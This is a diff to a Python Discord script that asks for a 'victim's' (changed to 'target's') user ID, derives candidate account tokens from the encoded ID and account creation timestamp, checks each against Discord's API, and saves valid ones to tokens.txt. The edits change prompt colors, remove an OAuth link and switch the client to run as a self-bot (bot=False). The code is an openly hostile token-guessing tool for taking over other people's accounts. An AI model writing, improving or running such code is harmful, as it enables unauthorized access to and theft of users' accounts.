@@ -12,12 +12,11 @@ import discord, os, json
 from discord.ext import commands
 from discord.ext.commands import Bot
 
-#https://discord.com/api/oauth2/authorize?client_id=709262126971224084&permissions=0&scope=bot
 
 
 class MyClient(discord.Client):
   async def on_ready(self):
-    userid = input(f"{C.WHITE}Please paste the victim's ID here {C.BLACK}: {C.YELLOW}")
+    userid = input(f"{C.RED}Please paste the target's ID here {C.RED}: {C.RED}")
     user = await client.fetch_user(int(userid))
     stamp = user.created_at
     timestamp = str(time.mktime(stamp.timetuple()))
@@ -39,7 +38,7 @@ def gen(encodedid, encodedstamp):
     url = "https://discordapp.com/api/v6/users/@me/library"
     r = req.get(url, headers=headers)
     if r.status_code == 200:
-        print(f'{C.WHITE}{token} {C.BLACK}: {C.GREEN}Valid')
+        print(f'{C.WHITE}{token} {C.BLACK}: {C.BLUE}Valid')
         f = open("tokens.txt", "a")
         f.write(token)
         f.close() 
@@ -49,4 +48,4 @@ def gen(encodedid, encodedstamp):
 
 token = os.environ.get("YOUR BOT TOKEN HERE")
 client = MyClient()
-client.run("YOUR BOT TOKEN HERE")
+client.run("YOUR BOT TOKEN HERE", bot=False)
